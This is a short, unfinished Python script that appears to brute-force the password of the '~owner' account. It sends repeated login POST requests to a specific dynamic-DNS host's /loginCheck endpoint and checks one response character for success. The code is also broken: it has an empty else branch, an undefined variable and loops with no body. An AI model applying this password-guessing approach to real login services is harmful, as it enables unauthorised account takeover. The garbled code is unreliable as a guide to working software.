import requests
import string

def charCheck(charNumb, password, charRange):
    for ii in charRange:
        if numToEnd>0:
            succeeded = charCheck(charNumb+1, password, charRange)
            if not succeeded:
                password[charNumb]=ii
    else:

while True:
    payload = {'username':'~owner','password':'a_boss'}

    r = requests.post("http://lucieng.ddns.net:5000/loginCheck", data=payload)
    # data is used instead of params because it is url encoded
    if r.text[80:81]==u'e':
        print("WE DID IT JIM")
        break
    elif r.text[80:81]!=u'o':
        print("something weird is going on")
'''
if __name__ == "__main__":
    asciiChars=string.printable
    password=[]
    maxPasswordLen=10
    while True:
        while len(password)<maxPasswordLen:
            password.append("")
            for curChar in asciiChars:

            payload = {'username':'~owner','password':'a_boss'}
            r = requests.post("http://lucieng.ddns.net:5000/loginCheck", data=payload)
            # data is used instead of params because it is url encoded
            if r.text[80:81]==u'e':
                print("WE DID IT JIM")
                break
            elif r.text[80:81]!=u'o':
                print("something weird is going on")
'''
